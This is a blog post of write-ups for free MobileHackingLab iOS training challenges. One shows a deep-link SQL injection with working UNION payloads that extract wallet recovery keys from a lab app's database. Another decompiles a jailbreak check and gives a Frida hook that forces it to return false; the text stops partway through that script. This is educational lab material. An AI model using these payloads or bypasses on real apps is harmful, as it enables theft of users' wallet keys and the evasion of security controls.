<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="MobileHackingLab IOS Challenges Writeups" /><meta name="author" content="Muhammad Adel" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://itsfading.github.io/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/" /><meta property="og:url" content="https://itsfading.github.io/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/" /><meta property="og:site_name" content="Muhammad Adel" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-04-07T13:40:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="MobileHackingLab IOS Challenges Writeups" /><meta name="twitter:site" content="@ItsFadinG_" /><meta name="twitter:creator" content="@Muhammad Adel" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Muhammad Adel"},"dateModified":"2025-04-22T14:54:29+02:00","datePublished":"2025-04-07T13:40:00+02:00","description":"Introduction","headline":"MobileHackingLab IOS Challenges Writeups","mainEntityOfPage":{"@type":"WebPage","@id":"https://itsfading.github.io/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/"},"url":"https://itsfading.github.io/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/"}</script><title>MobileHackingLab IOS Challenges Writeups | Muhammad Adel</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Muhammad Adel"><meta name="application-name" content="Muhammad Adel"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/Mine.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Muhammad Adel</a></div><div class="site-subtitle font-italic">CyberSecurity geek, who wants to share his day-to-day knowledge</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://twitter.com/ItsFadinG_" aria-label="twitter" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/muhammadadel14" aria-label="linkedin" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/ItsFadinG" aria-label="github" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Muhammad.adel.tr','gmail.com'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>MobileHackingLab IOS Challenges Writeups</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>MobileHackingLab IOS Challenges Writeups</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Muhammad Adel </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 7, 2025, 1:40 PM +0200" prep="on" > Apr 7 <i class="unloaded">2025-04-07T13:40:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Apr 22, 2025, 2:54 PM +0200" prefix="Updated " > Apr 22 <i class="unloaded">2025-04-22T14:54:29+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1806 words">10 min</span></div></div><div class="post-content"><h2 id="introduction"><strong>Introduction</strong></h2><p>Peace be upon all of you. In this post, I am going to share writeups for some of the IOS Challenges of the free MobileHackingLab IOS Application Security course.</p><p>Course Link: <a href="https://www.mobilehackinglab.com/course/free-ios-application-security-course">https://www.mobilehackinglab.com/course/free-ios-application-security-course</a></p><p>Challenges Link: <a href="https://www.mobilehackinglab.com/free-mobile-hacking-labs">https://www.mobilehackinglab.com/free-mobile-hacking-labs</a></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/main.png" alt="image.png" height="600" /></p><h2 id="flipcoin-wallet"><strong>FlipCoin Wallet</strong></h2><p><strong>Description</strong></p><blockquote><p>The challenge is centered around a fictious crypto currency flipcoin and its wallet Flipcoin Wallet. The Flipcoin wallet is an offline wallet giving users full ownership of their digital assets. The challenge highlights the potential entrypoints that can lead to further serious vulnerabilities including SQL injection. As an attacker, your aim is to craft an exploit that can be used to attack other users of the application.</p></blockquote><p><strong>Objective</strong></p><blockquote><p>Craft a payload to gain access to the local database: Your task is to find your way to the locally stored SQL database and craft an exploit that can access the recovery keys of another user’s wallet.</p></blockquote><p>Let’s start by installing the application on our iPhone device via the <code class="language-plaintext highlighter-rouge">ideviceinstaller</code> tool.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ideviceinstaller <span class="nb">install </span>com.mobilehackinglab.Flipcoin-Wallet6.ipa
WARNING: could not locate iTunesMetadata.plist <span class="k">in </span>archive!
WARNING: could not locate Payload/Flipcoin Wallet.app/SC_Info/Flipcoin Wallet.sinf <span class="k">in </span>archive!
Copying <span class="s1">'com.mobilehackinglab.Flipcoin-Wallet6.ipa'</span> to device... DONE.
Installing <span class="s1">'com.mobilehackinglab.Flipcoin-Wallet6'</span>
Install: CreatingStagingDirectory <span class="o">(</span>5%<span class="o">)</span>
Install: ExtractingPackage <span class="o">(</span>15%<span class="o">)</span>
Install: InspectingPackage <span class="o">(</span>20%<span class="o">)</span>
Install: TakingInstallLock <span class="o">(</span>20%<span class="o">)</span>
Install: PreflightingApplication <span class="o">(</span>30%<span class="o">)</span>
Install: InstallingEmbeddedProfile <span class="o">(</span>30%<span class="o">)</span>
Install: VerifyingApplication <span class="o">(</span>40%<span class="o">)</span>
Install: CreatingContainer <span class="o">(</span>50%<span class="o">)</span>
Install: InstallingApplication <span class="o">(</span>60%<span class="o">)</span>
Install: PostflightingApplication <span class="o">(</span>70%<span class="o">)</span>
Install: SandboxingApplication <span class="o">(</span>80%<span class="o">)</span>
Install: GeneratingApplicationMap <span class="o">(</span>90%<span class="o">)</span>
Install: Complete
</pre></table></code></div></div><p>Let’s familiarize ourselves with the app logic:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/home.png" alt="home.png" height="600" /></p><p>It seems that we have some a crypto coins wallet with some balance and the ability to send and receive money.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/send.png" alt="send.PNG" height="600" /></p><p>The receive function is giving us a QR code to share with the senders.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/2.png" alt="2.png" height="600" /></p><p>Hamm! So where can we inject our SQL payload? Maybe the <code class="language-plaintext highlighter-rouge">sendTo</code> or the Amount fields are vulnerable? But I had an issue in my iPhone 6s testing device after typing; the keyboard didn’t disappear, so I wasn’t able to click the send button.</p><p>I tried also to link my device with Burp Suite to see if there are any requests going underline, but I only found this request:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/image.png" alt="image.png" /></p><p>Let’s inspect application files to see if we can find something interesting:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>PS <span class="o">&gt;</span> ssh root@192.168.1.17
iPhone:/var/mobile/Containers/Data/Application root<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-R</span> | <span class="nb">grep </span>coin
./62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Library/Caches/com.mobilehackinglab.Flipcoin-Wallet6:
./62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Library/Caches/com.mobilehackinglab.Flipcoin-Wallet6/com.apple.metal:
./62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Library/Caches/com.mobilehackinglab.Flipcoin-Wallet6/com.apple.metalfe:
./62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Library/Caches/com.mobilehackinglab.Flipcoin-Wallet6/fsCachedData:
iPhone:/ root<span class="nv">$ </span><span class="nb">cd</span>  /var/mobile/Containers/Data/Application/62BA1BD8-F7C8-49E8-8CD0-014265959BA9
iPhone:/var/mobile/Containers/Data/Application/62BA1BD8-F7C8-49E8-8CD0-014265959BA9 root<span class="nv">$ </span><span class="nb">cd </span>Documents
iPhone:/var/mobile/Containers/Data/Application/62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Documents root<span class="nv">$ </span><span class="nb">ls
</span>your_database_name.sqlite
</pre></table></code></div></div><p>Let’s examine this SQLite file:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>iPhone:/var/mobile/Containers/Data/Application/62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Documents root<span class="nv">$ </span>sqlite3 your_database_name.sqlite
SQLite version 3.34.1 2021-01-20 14:10:07
Enter <span class="s2">".help"</span> <span class="k">for </span>usage hints.
sqlite&gt; .schema
CREATE TABLE wallet <span class="o">(</span>
        <span class="nb">id </span>INTEGER PRIMARY KEY AUTOINCREMENT,
        address TEXT,
        currency FLOAT,
        amount FLOAT,
        recovery_key TEXT
    <span class="o">)</span><span class="p">;</span>
CREATE TABLE sqlite_sequence<span class="o">(</span>name,seq<span class="o">)</span><span class="p">;</span>
sqlite&gt; .tables
wallet
sqlite&gt; SELECT <span class="k">*</span> FROM wallet<span class="p">;</span>
1|0x252B2Fff0d264d946n1004E581bb0a46175DC009|flipcoin|0.3654|FLAG<span class="o">{</span>fl1p_d4_c01nz<span class="o">}}</span>
2|1W5vKAAKmBAjjtpCkGZREjgEGjrbwERND|bitcoin|15.26|BATTLE TOADS WRITING POEMS
</pre></table></code></div></div><p>Oh?? Is this the challenge? We have found the two recovery keys along with the flag. But this is not how the challenge should be solved? We need to extract this data via SQL injection.</p><p>With no hope, I have tried to scan the QR code above to see what is inside, and I found this interesting DeepLink:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount<span class="o">=</span>000
</pre></table></code></div></div><p>Let’s try to run it and see what we will return from the application, we will use the <code class="language-plaintext highlighter-rouge">uiopen</code> command inside the iPhone shell:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># flipcoin://[WalletAddress]?[amountParamter]=[value]</span>
uiopen <span class="s2">"flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003"</span>  
</pre></table></code></div></div><p>Executing this command will open the following screen on the iPhone device.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/1.png" alt="1.png" height="600" /></p><p>I thought the amount might be the vulnerable parameter, but where will the results come back? Getting back to Burp Suite I found this interesting request:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/normal_request.png" alt="normal request.png" /></p><p>Let’s study again the SQL schema before injecting any command:</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="n">sqlite</span><span class="o">&gt;</span> <span class="p">.</span><span class="k">schema</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">wallet</span> <span class="p">(</span>
        <span class="n">id</span> <span class="nb">INTEGER</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="n">AUTOINCREMENT</span><span class="p">,</span>
        <span class="n">address</span> <span class="nb">TEXT</span><span class="p">,</span>
        <span class="n">currency</span> <span class="nb">FLOAT</span><span class="p">,</span>
        <span class="n">amount</span> <span class="nb">FLOAT</span><span class="p">,</span>
        <span class="n">recovery_key</span> <span class="nb">TEXT</span>
    <span class="p">);</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">sqlite_sequence</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">seq</span><span class="p">);</span>
<span class="n">sqlite</span><span class="o">&gt;</span> <span class="p">.</span><span class="n">tables</span>
<span class="n">wallet</span>
<span class="n">sqlite</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">wallet</span><span class="p">;</span>
<span class="mi">1</span><span class="o">|</span><span class="mi">0</span><span class="n">x252B2Fff0d264d946n1004E581bb0a46175DC009</span><span class="o">|</span><span class="n">flipcoin</span><span class="o">|</span><span class="mi">0</span><span class="p">.</span><span class="mi">3654</span><span class="o">|</span><span class="n">FLAG</span><span class="p">{</span><span class="n">fl1p_d4_c01nz</span><span class="p">}}</span>
<span class="mi">2</span><span class="o">|</span><span class="mi">1</span><span class="n">W5vKAAKmBAjjtpCkGZREjgEGjrbwERND</span><span class="o">|</span><span class="n">bitcoin</span><span class="o">|</span><span class="mi">15</span><span class="p">.</span><span class="mi">26</span><span class="o">|</span><span class="n">BATTLE</span> <span class="n">TOADS</span> <span class="n">WRITING</span> <span class="n">POEMS</span>
</pre></table></code></div></div><p>So we have 5 columns, and our goal is to get the <code class="language-plaintext highlighter-rouge">recovery_key</code> column. What I can notice from the request is that the first value of the <code class="language-plaintext highlighter-rouge">params</code> is the address of the first ID. So let’s inject a SQL payload that changes the ID to 2.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># Payload: AND id=2;--</span>
uiopen <span class="s2">"flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003%20AND%20id=2;--"</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/sql_1.png" alt="sql 1.png" /></p><p>Great! The second wallet address was added in the request. Now we know that we have a SQL injection we know can get the <code class="language-plaintext highlighter-rouge">recovery_key</code> column. After some trial and error, the union technique worked with:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># Payload: UNION SELECT 0,'ItsFadinG',3,4,'a' LIMIT 1;--</span>
uiopen <span class="s2">"flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003%20UNION%20SELECT%200,'ItsFadinG',3,4,'a'%20LIMIT%201;--"</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/image%201.png" alt="image.png" /></p><p>Lastly, let’s get both recovery keys:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># UNION SELECT 0,(SELECT recovery_key FROM wallet),3,4,'a' LIMIT 1;--</span>
<span class="c"># UNION SELECT 0,(SELECT recovery_key FROM wallet WHERE id=2),3,4,'a' LIMIT 1;</span>
uiopen <span class="s2">"flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003%20UNION%20SELECT%200,(SELECT%20recovery_key%20FROM%20wallet),3,4,'a'%20LIMIT%201;--"</span>
uiopen <span class="s2">"flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003%20UNION%20SELECT%200,(SELECT%20recovery_key%20FROM%20wallet%20WHERE%20id=2),3,4,'a'%20LIMIT%201;--"</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/Untitled.png" alt="Untitled.png" /></p><h2 id="no-escape"><strong>No Escape</strong></h2><p><strong>Description</strong></p><blockquote><p>The challenge centers around a fictitious app called No Escape, designed with robust jailbreak detection mechanisms. Your mission is to bypass these mechanisms and gain full access to the app’s functionalities using Frida.</p></blockquote><p><strong>Objective</strong></p><blockquote><p>Your task is to evade the jailbreak detection implemented in the No Escape app to execute arbitrary code and access all app features.</p></blockquote><p>App package Name: <code class="language-plaintext highlighter-rouge">com.mobilehackinglab.No-Escape</code></p><p>Let’s open our app, and we got the following message as expected:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/IMG_0026.png" alt="IMG_0026.PNG" height="600" /></p><p>Let’s try to find the classes responsible for Jailbreak Detection:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/image%202.png" alt="image.png" /></p><p>hmm! There is no output; let’s analyze the binary file via Ghidra and search for the message that was previously shown:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/image%203.png" alt="image.png" /></p><p>For more clarification, I have renamed the variables, and it is obvious that the application is checking for jailbreak:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/MHL/image%204.png" alt="image.png" /></p><p>Let’s check the  <code class="language-plaintext highlighter-rouge">_$s9No_Escape12isJailbrokenSbyF()</code> function implementation.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="n">bool</span> <span class="n">_</span><span class="err">$</span><span class="n">s9No_Escape12isJailbrokenSbyF</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">bool</span> <span class="n">bVar1</span><span class="p">;</span>
  <span class="n">dword</span> <span class="n">dVar2</span><span class="p">;</span>
  <span class="n">dword</span> <span class="n">local_18</span><span class="p">;</span>
  <span class="n">dword</span> <span class="n">local_14</span><span class="p">;</span>
  
  <span class="n">dVar2</span> <span class="o">=</span> <span class="n">_</span><span class="err">$</span><span class="n">s9No_Escape22checkForJailbreakFiles33_BCE8F13474E5A52C60853EA803F80A81LLSbyF</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">dVar2</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">local_14</span> <span class="o">=</span> <span class="n">_</span><span class="err">$</span><span class="n">s9No_Escape33checkForWritableSystemDirectories33_BCE8F13474E5A52C60853EA803F80A81LLSbyF</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">local_14</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">local_14</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">local_18</span> <span class="o">=</span> <span class="n">_</span><span class="err">$</span><span class="n">s9No_Escape12canOpenCydia33_BCE8F13474E5A52C60853EA803F80A81LLSbyF</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">local_18</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">local_18</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">bVar1</span> <span class="o">=</span> <span class="n">_</span><span class="err">$</span><span class="n">s9No_Escape21checkSandboxViolation33_BCE8F13474E5A52C60853EA803F80A81LLSbyF</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">bVar1</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">bVar1</span> <span class="o">!=</span> <span class="nb">false</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Functions appear to be implemented in SWIFT and their names are mangled (obfuscated). We have two ways to bypass this, either by trying to hook each function check or just simply hook and modify the return value of the main function: <code class="language-plaintext highlighter-rouge">_$s9No_Escape12isJailbrokenSbyF()</code>.</p><p>I have used the following script to bypass the function and return False for the jailbreak.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">myMethod</span> <span class="o">=</span> <span class="nx">Module</span><span class="p">.</span><span class="nf">findExportByName</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="dl">"</span><span class="s2">$s9No_Escape12isJailbrokenSbyF</span><span class="dl">"</span><span class="p">);</span>

<span class="k">if </span><span class="p">(</span><span class="nx">myMethod</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">Interceptor</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="nx">myMethod</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">onLeave</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">retval</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Returned Swift value:</span><span class="dl">"</span><span class="p">,</span> <span class="nx">retval</span><span class="p">);</span>
            <span class="c1">// You can inspect or modify retval here</span>
            <span class="nx">retval</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Modefied Return Swift value TO: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">retval</span><span class="p">);</span>
        <span class="p">}</span>
